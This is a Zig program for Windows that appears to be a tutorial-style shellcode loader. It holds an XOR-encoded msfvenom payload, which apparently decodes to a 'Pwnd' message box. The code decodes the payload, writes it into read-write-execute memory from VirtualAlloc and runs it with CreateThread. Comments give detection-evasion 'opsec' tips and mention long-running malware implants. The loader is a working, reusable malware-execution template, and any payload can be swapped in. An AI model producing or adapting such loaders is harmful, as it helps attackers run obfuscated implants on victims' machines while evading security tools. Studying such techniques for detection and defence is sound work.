const std = @import("std");
// Use std.os.windows as win, this providers wrappers for the Winodws APIs.
const win = @import("std").os.windows;

fn crypter(shellcode: []u8, key: u8) void {
    for(shellcode) |*byte| {
        byte.* ^= key;
    }
}

// Define inject_local function, it takes the shellcode as an argument
fn inject_local(shellcode: []u8) !void {
    // In this example, we use VirtualAlloc() to allocate memory for our shellcode and copy it

    // Allocate RWX (read-write-execute) memory to execute the shellcode from
    // Opsec tip: RWX memory can easily be detected. Consider making memory RW first, then RX after writing your shellcode
    // reference: https://ziglang.org/documentation/master/std/#A;std:os.windows.VirtualAlloc, https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
    var executable_memory_space = try win.VirtualAlloc(
        null, // Address to start allocation from. Null means 'anywhere'
        shellcode.len, // Size of allocation
        win.MEM_COMMIT | win.MEM_RESERVE, // Allocate memory immediately
        win.PAGE_EXECUTE_READWRITE, // Memory protection flags
    );

    // Convert the LPVOID (which is a *anyopaque type in Zig) result from VirtualAlloc() to a many-item pointer which can be used by @memcpy
    var executable_memory_ptr = @as([*]u8, @ptrCast(executable_memory_space));
    // Copy the shellcode into our assigned region of RWX memory

    crypter(shellcode, 0x37);

    @memcpy(executable_memory_ptr[0..shellcode.len], shellcode);

    // Create a thread at the start of the executable shellcode to run it!
    // reference: https://ziglang.org/documentation/master/std/#A;std:os.windows.kernel32.CreateThread, https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread
    var thread_handle = win.kernel32.CreateThread(
        null, 
        0, 
        @ptrCast(@alignCast(executable_memory_space)), // lpStartAdress requires a function pointer, not the *anyopaque that executable_memory_space is, it can be casted to a function pointer using @ptrCast, the alignment of the pointer is fixed with @alignCast
        null, 
        0, 
        null
    );

    // Wait for our thread to exit to prevent program from closing before the shellcode ends
    // This is especially relevant for long-running shellcode, such as malware implants
    // reference: https://ziglang.org/documentation/master/std/#A;std:os.windows.kernel32.WaitForSingleObject, https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject
    _ = win.kernel32.WaitForSingleObject(
        thread_handle.?,
        win.INFINITE,
    );

    // WinAPI memory cleanup, free the memory we allocated earlier and close the thread handle
    // reference: https://ziglang.org/documentation/master/std/#A;std:os.windows.kernel32.VirtualFree, https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualfree
    _ = win.kernel32.VirtualFree(
        executable_memory_space,
        0,
        win.MEM_FREE,
    );
    _ = win.CloseHandle(thread_handle.?);
}

// Main function entrypoint
pub fn main() !void {
    // Define our shellcode as an array of 'u8' (unsigned 8-bit integers)
    // msfvenom does not currently support Zig directly, but its shellcode generation can still be used.
    var shellcode = [_]u8{ 203, 127, 182, 211, 199, 200, 200, 200, 223, 231, 55, 55, 55, 118, 102, 118, 103, 101, 102, 97, 127, 6, 229, 82, 127, 188, 101, 87, 9, 127, 188, 101, 47, 9, 127, 188, 101, 23, 9, 127, 188, 69, 103, 9, 127, 56, 128, 125, 125, 122, 6, 254, 127, 6, 247, 155, 11, 86, 75, 53, 27, 23, 118, 246, 254, 58, 118, 54, 246, 213, 218, 101, 118, 102, 9, 127, 188, 101, 23, 9, 188, 117, 11, 127, 54, 231, 9, 188, 183, 191, 55, 55, 55, 127, 178, 247, 67, 88, 127, 54, 231, 103, 9, 188, 127, 47, 9, 115, 188, 119, 23, 126, 54, 231, 212, 107, 127, 200, 254, 9, 118, 188, 3, 191, 127, 54, 225, 122, 6, 254, 127, 6, 247, 155, 118, 246, 254, 58, 118, 54, 246, 15, 215, 66, 198, 9, 123, 52, 123, 19, 63, 114, 14, 230, 66, 225, 111, 9, 115, 188, 119, 19, 126, 54, 231, 81, 9, 118, 188, 59, 127, 9, 115, 188, 119, 43, 126, 54, 231, 9, 118, 188, 51, 191, 127, 54, 231, 118, 111, 118, 111, 105, 110, 109, 118, 111, 118, 110, 118, 109, 127, 180, 219, 23, 118, 101, 200, 215, 111, 118, 110, 109, 9, 127, 188, 37, 222, 126, 200, 200, 200, 106, 9, 127, 186, 186, 45, 54, 55, 55, 118, 141, 123, 64, 17, 48, 200, 226, 126, 240, 246, 55, 55, 55, 55, 9, 127, 186, 162, 57, 54, 55, 55, 9, 123, 186, 178, 34, 54, 55, 55, 127, 6, 254, 118, 141, 114, 180, 97, 48, 200, 226, 127, 6, 254, 118, 141, 199, 130, 149, 97, 200, 226, 127, 86, 79, 79, 82, 83, 55, 103, 64, 89, 83, 55, 66, 68, 82, 69, 4, 5, 25, 83, 91, 91, 55 };
    
    // Run with variable, allows for error-return, useful in debugging, may be adjusted to use without.
    var inject = try inject_local(&shellcode);
    _ = inject;
}
